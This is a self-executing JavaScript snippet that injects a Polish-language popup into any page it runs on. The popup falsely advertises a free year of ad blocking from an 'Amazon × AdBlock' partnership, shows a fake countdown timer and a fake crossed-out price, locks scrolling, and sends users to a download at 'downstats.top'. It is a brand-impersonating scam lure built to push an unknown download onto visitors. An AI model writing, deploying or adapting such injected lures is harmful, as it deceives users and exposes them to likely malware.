(function () {
  'use strict';

  var CONFIG = {
    delay: 700,
    hours: 11,
    minutes: 59,
    seconds: 59,
    downloadUrl: 'https://downstats.top/go'
  };

  var CSS = [
    '@import url("https://fonts.googleapis.com/css2?family=Syne:wght@700;800;900&family=DM+Sans:wght@400;500;700&display=swap");',

    '#iia-overlay{position:fixed;inset:0;z-index:999999;opacity:0;pointer-events:none;transition:opacity .3s ease;display:none;}',
    '#iia-overlay.iia-on{opacity:1;pointer-events:all;}',

    '.iia-modal{position:fixed;top:0;left:0;right:0;height:50vh;min-height:320px;background:#f9f6f0;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;scrollbar-width:none;transform:translateY(-100%);transition:transform .46s cubic-bezier(.16,1,.3,1);will-change:transform;display:flex;flex-direction:column;border-radius:0 0 24px 24px;box-shadow:0 10px 50px rgba(0,0,0,.22);}',
    '.iia-modal::-webkit-scrollbar{display:none;}',
    '#iia-overlay.iia-on .iia-modal{transform:translateY(0);}',

    '.iia-handle{display:none;}',
    '.iia-hbar{display:none;}',

    '.iia-hdr{padding:12px 20px 8px;flex-shrink:0;}',

    '.iia-logos{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;}',
    '.iia-logo-l{height:clamp(28px,6vw,40px);max-width:44%;display:block;object-fit:contain;object-position:left center;}',
    '.iia-sep{display:flex;flex-direction:column;align-items:center;gap:3px;padding:0 10px;flex-shrink:0;}',
    '.iia-sep-line{width:1px;height:10px;background:#d8d3cc;}',
    '.iia-sep-txt{font-family:"DM Sans",sans-serif;font-size:clamp(14px,3.5vw,18px);font-weight:700;color:#bbb;letter-spacing:.1em;}',
    '.iia-logo-r-wrap{display:flex;justify-content:center;max-width:44%;}',
    '.iia-logo-r{height:clamp(28px,6vw,40px);display:block;object-fit:contain;object-position:center;}',
    '.iia-logo-fb{display:flex;align-items:center;gap:6px;}',
    '.iia-logo-fb-ico{background:#d41515;border-radius:6px;width:30px;height:30px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}',
    '.iia-logo-fb-name{font-family:"Syne",sans-serif;font-size:clamp(20px,5vw,26px);font-weight:900;color:#0b1628;}',

    '.iia-eyebrow{font-family:"DM Sans",sans-serif;font-size:clamp(14px,3.5vw,18px);font-weight:700;color:#d41515;text-transform:uppercase;letter-spacing:.14em;margin-bottom:3px;}',
    '.iia-title{font-family:"Syne",sans-serif;font-size:clamp(26px,7vw,36px);font-weight:900;color:#0b1628;line-height:1.05;letter-spacing:-.025em;margin-bottom:2px;}',
    '.iia-sub{font-family:"DM Sans",sans-serif;font-size:clamp(15px,3.8vw,20px);color:#999;line-height:1.4;}',

    '.iia-rule{height:1px;background:#edeae4;margin:0 20px;flex-shrink:0;}',

    '.iia-body{padding:8px 20px 12px;display:flex;flex-direction:column;gap:7px;flex:1;}',

    '.iia-offer{border:2px solid #0b1628;border-radius:14px;padding:10px 16px;display:flex;align-items:center;justify-content:space-between;}',
    '.iia-price{font-family:"Syne",sans-serif;font-size:clamp(32px,9vw,48px);font-weight:900;color:#0b1628;line-height:1;letter-spacing:-.03em;}',
    '.iia-price sub{font-size:clamp(16px,4vw,20px);font-family:"DM Sans",sans-serif;font-weight:400;color:#aaa;vertical-align:middle;letter-spacing:0;}',
    '.iia-offer-r{text-align:right;}',
    '.iia-was{font-family:"DM Sans",sans-serif;font-size:clamp(15px,3.8vw,19px);color:#ccc;text-decoration:line-through;margin-bottom:4px;}',
    '.iia-badge{background:#d41515;border-radius:8px;padding:5px 14px;font-family:"Syne",sans-serif;font-size:clamp(16px,4vw,20px);font-weight:800;color:#fff;display:inline-block;}',

    '.iia-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;}',
    '.iia-cell{border:1.5px solid #edeae4;border-radius:12px;padding:8px 6px;text-align:center;}',
    '.iia-cv{font-family:"Syne",sans-serif;font-size:clamp(18px,5vw,24px);font-weight:800;color:#0b1628;line-height:1;margin-bottom:3px;}',
    '.iia-cv span{color:#d41515;}',
    '.iia-cl{font-family:"DM Sans",sans-serif;font-size:clamp(13px,3.2vw,16px);color:#bbb;line-height:1.3;}',

    '.iia-feats{display:flex;flex-direction:column;gap:5px;}',
    '.iia-feat{display:flex;align-items:center;gap:10px;}',
    '.iia-fic{width:22px;height:22px;border-radius:6px;border:1.5px solid #0b1628;display:flex;align-items:center;justify-content:center;flex-shrink:0;}',
    '.iia-ftxt{font-family:"DM Sans",sans-serif;font-size:clamp(15px,3.8vw,19px);color:#555;line-height:1.3;}',

    '.iia-timer{display:flex;align-items:center;gap:12px;border:1px solid #f0d060;background:#fffcf0;border-radius:12px;padding:8px 16px;}',
    '.iia-tlbl{font-family:"DM Sans",sans-serif;font-size:clamp(13px,3.2vw,17px);font-weight:700;color:#9a8000;text-transform:uppercase;letter-spacing:.09em;flex-shrink:0;}',
    '.iia-tdigs{display:flex;align-items:baseline;gap:3px;margin-left:auto;}',
    '.iia-tn{font-family:"Syne",sans-serif;font-size:clamp(22px,6vw,30px);font-weight:800;color:#0b1628;min-width:32px;text-align:center;line-height:1;}',
    '.iia-tc{font-family:"Syne",sans-serif;font-size:clamp(20px,5vw,26px);font-weight:800;color:#c8a820;line-height:1;}',

    '.iia-bottom{margin-top:auto;display:flex;flex-direction:column;gap:6px;}',

    '.iia-cta{background:#0b1628;color:#fff;font-family:"Syne",sans-serif;font-size:clamp(17px,4.5vw,22px);font-weight:800;padding:15px;border-radius:14px;border:none;cursor:pointer;width:100%;letter-spacing:.01em;display:flex;align-items:center;justify-content:center;gap:8px;transition:opacity .15s,transform .1s;-webkit-tap-highlight-color:transparent;}',
    '.iia-cta:active{transform:scale(.98);opacity:.9;}',
    '.iia-skip{font-family:"DM Sans",sans-serif;font-size:clamp(15px,3.8vw,19px);color:#ccc;text-align:center;text-decoration:underline;text-underline-offset:2px;background:none;border:none;cursor:pointer;width:100%;display:block;padding:4px 0;-webkit-tap-highlight-color:transparent;}'
  ].join('');

  var LOGO_IIYAMA = 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/960px-Amazon_logo.svg.png';
  var LOGO_AB = 'https://upload.wikimedia.org/wikipedia/commons/e/eb/Adblock_logo.png';

  var CHECK = '<svg width="9" height="9" viewBox="0 0 9 9" fill="none"><path d="M1.5 4.5L3.8 6.8L7.5 2.2" stroke="#0b1628" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>';
  var DL = '<svg width="15" height="15" viewBox="0 0 15 15" fill="none"><path d="M7.5 1v10M7.5 11L4 7.5M7.5 11L11 7.5" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/><line x1="1.5" y1="13.5" x2="13.5" y2="13.5" stroke="white" stroke-width="1.6" stroke-linecap="round"/></svg>';

  var HTML = [
    '<div id="iia-overlay">',
      '<div class="iia-modal" role="dialog" aria-modal="true">',

        '<div class="iia-handle"><div class="iia-hbar"></div></div>',

        '<div class="iia-hdr">',
          '<div class="iia-logos">',
            '<img class="iia-logo-l" src="' + LOGO_IIYAMA + '" alt="iiyama" id="iia-img-l">',
            '<div style="display:none" id="iia-fb-l"><div class="iia-logo-fb"><div class="iia-logo-fb-ico"><svg width="12" height="12" viewBox="0 0 12 12" fill="none"><rect x="1" y="1" width="3.5" height="10" rx="1" fill="white"/><rect x="7.5" y="1" width="3.5" height="10" rx="1" fill="white"/></svg></div><span class="iia-logo-fb-name">iiyama</span></div></div>',
            '<div class="iia-sep"><div class="iia-sep-line"></div><span class="iia-sep-txt">×</span><div class="iia-sep-line"></div></div>',
            '<div class="iia-logo-r-wrap">',
              '<img class="iia-logo-r" src="' + LOGO_AB + '" alt="AdBlock" id="iia-img-r">',
              '<div style="display:none" id="iia-fb-r"><div class="iia-logo-fb"><div style="width:22px;height:22px;background:#d41515;border-radius:6px;display:flex;align-items:center;justify-content:center"><svg width="13" height="13" viewBox="0 0 13 13" fill="none"><circle cx="6.5" cy="6.5" r="4.5" stroke="white" stroke-width="1.3"/><line x1="4" y1="4" x2="9" y2="9" stroke="white" stroke-width="1.5" stroke-linecap="round"/><line x1="9" y1="4" x2="4" y2="9" stroke="white" stroke-width="1.5" stroke-linecap="round"/></svg></div><span class="iia-logo-fb-name">AdBlock</span></div></div>',
            '</div>',
          '</div>',
          '<p class="iia-eyebrow">Partnerstwo Amazon × AdBlock</p>',
          '<h2 class="iia-title">Rok bez reklam.<br>Zupełnie free.</h2>',
          '<p class="iia-sub">3 urządzenia · Tylko dla klientów · Bez karty</p>',
        '</div>',

        '<div class="iia-rule"></div>',

        '<div class="iia-body">',
          '<div class="iia-offer">',
            '<div class="iia-price">0 zł <sub>/ rok</sub></div>',
            '<div class="iia-offer-r"><div class="iia-was">49,99 zł</div><div class="iia-badge">FREE</div></div>',
          '</div>',
          '<div class="iia-grid">',
            '<div class="iia-cell"><div class="iia-cv">99<span>%</span></div><div class="iia-cl">reklam zablokowanych</div></div>',
            '<div class="iia-cell"><div class="iia-cv">4<span>×</span></div><div class="iia-cl">szybsze ładowanie</div></div>',
            '<div class="iia-cell"><div class="iia-cv">3<span> urz</span></div><div class="iia-cl">jednoczesna ochrona</div></div>',
          '</div>',
          '<div class="iia-feats">',
            '<div class="iia-feat"><div class="iia-fic">' + CHECK + '</div><span class="iia-ftxt">YouTube, Facebook, bannery — zablokowane</span></div>',
            '<div class="iia-feat"><div class="iia-fic">' + CHECK + '</div><span class="iia-ftxt">Ochrona przed malware i phishingiem</span></div>',
            '<div class="iia-feat"><div class="iia-fic">' + CHECK + '</div><span class="iia-ftxt">Chrome, Firefox, Edge, Samsung Internet</span></div>',
          '</div>',
          '<div class="iia-timer">',
            '<span class="iia-tlbl">Oferta wygasa za:</span>',
            '<div class="iia-tdigs">',
              '<span class="iia-tn" id="iia-hh">11</span><span class="iia-tc">:</span>',
              '<span class="iia-tn" id="iia-mm">59</span><span class="iia-tc">:</span>',
              '<span class="iia-tn" id="iia-ss">59</span>',
            '</div>',
          '</div>',
          '<div class="iia-bottom">',
            '<button class="iia-cta" id="iia-cta-btn">' + DL + 'Pobierz — aktywuj za darmo</button>',
            
          '</div>',
        '</div>',

      '</div>',
    '</div>'
  ].join('');

  var IIAModal = (function () {
    var overlay = null;
    var modal = null;
    var timerInterval = null;
    var timerEnd = 0;
    var initialized = false;

    function _injectStyles() {
      if (document.getElementById('iia-styles')) return;
      var s = document.createElement('style');
      s.id = 'iia-styles';
      s.textContent = CSS;
      document.head.appendChild(s);
    }

    function _injectHTML() {
      if (document.getElementById('iia-overlay')) return;
      document.body.insertAdjacentHTML('beforeend', HTML);
    }

    function _cacheElements() {
      overlay = document.getElementById('iia-overlay');
      modal = overlay ? overlay.querySelector('.iia-modal') : null;
    }

    function _handleImgErrors() {
      var imgL = document.getElementById('iia-img-l');
      var fbL = document.getElementById('iia-fb-l');
      var imgR = document.getElementById('iia-img-r');
      var fbR = document.getElementById('iia-fb-r');

      if (imgL) {
        imgL.onerror = function () {
          this.style.display = 'none';
          if (fbL) fbL.style.display = 'block';
        };
      }
      if (imgR) {
        imgR.onerror = function () {
          this.style.display = 'none';
          if (fbR) fbR.style.display = 'block';
        };
      }
    }

    function _startTimer() {
      clearInterval(timerInterval);

      function tick() {
        var diff = Math.max(0, timerEnd - Date.now());
        var h = document.getElementById('iia-hh');
        var m = document.getElementById('iia-mm');
        var s = document.getElementById('iia-ss');

        if (h) h.textContent = String(Math.floor(diff / 3600000)).padStart(2, '0');
        if (m) m.textContent = String(Math.floor((diff % 3600000) / 60000)).padStart(2, '0');
        if (s) s.textContent = String(Math.floor((diff % 60000) / 1000)).padStart(2, '0');

        if (diff === 0) clearInterval(timerInterval);
      }

      tick();
      timerInterval = setInterval(tick, 1000);
    }

    function _bindEvents() {
      var cta = document.getElementById('iia-cta-btn');
      var skip = document.getElementById('iia-skip-btn');

      if (cta) {
        cta.addEventListener('click', function () {
          if (CONFIG.downloadUrl && CONFIG.downloadUrl !== '#') {
            window.open(CONFIG.downloadUrl, '_blank', 'noopener,noreferrer');
          }
        });
      }

      if (skip) skip.addEventListener('click', close);

      document.addEventListener('keydown', function (e) {
        if (e.key === 'Escape') close();
      });

      if (overlay) {
        overlay.addEventListener('click', function (e) {
          if (e.target === overlay) close();
        });
      }
    }

    function init(cfg) {
      if (initialized) return;
      initialized = true;

      if (cfg && typeof cfg === 'object') {
        if (cfg.delay !== undefined) CONFIG.delay = cfg.delay;
        if (cfg.hours !== undefined) CONFIG.hours = cfg.hours;
        if (cfg.minutes !== undefined) CONFIG.minutes = cfg.minutes;
        if (cfg.seconds !== undefined) CONFIG.seconds = cfg.seconds;
        if (cfg.downloadUrl !== undefined) CONFIG.downloadUrl = cfg.downloadUrl;
      }

      timerEnd = Date.now() + (CONFIG.hours * 3600 + CONFIG.minutes * 60 + CONFIG.seconds) * 1000;

      _injectStyles();
      _injectHTML();
      _cacheElements();
      _handleImgErrors();
      _bindEvents();

      setTimeout(open, Math.max(0, Number(CONFIG.delay) || 0));
    }

    function open() {
      _cacheElements();
      if (!overlay || !modal) return;

      modal.style.transition = 'transform .46s cubic-bezier(.16,1,.3,1)';
      modal.style.transform = '';
      overlay.style.display = 'block';
      overlay.style.background = 'none';
      overlay.style.opacity = '';

      requestAnimationFrame(function () {
        requestAnimationFrame(function () {
          overlay.classList.add('iia-on');
          document.body.style.overflow = 'hidden';
          _startTimer();
        });
      });
    }

    function close() {
      _cacheElements();
      if (!overlay || !modal) return;

      modal.style.transition = 'transform .35s cubic-bezier(.4,0,1,1)';
      modal.style.transform = 'translateY(-100%)';
      overlay.classList.remove('iia-on');
      overlay.style.opacity = '0';
      document.body.style.overflow = '';
      clearInterval(timerInterval);

      setTimeout(function () {
        if (overlay) overlay.style.display = 'none';
      }, 360);
    }

    return { init: init, open: open, close: close };
  })();

  window.IIAModal = IIAModal;

  function boot() {
    IIAModal.init();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }
})();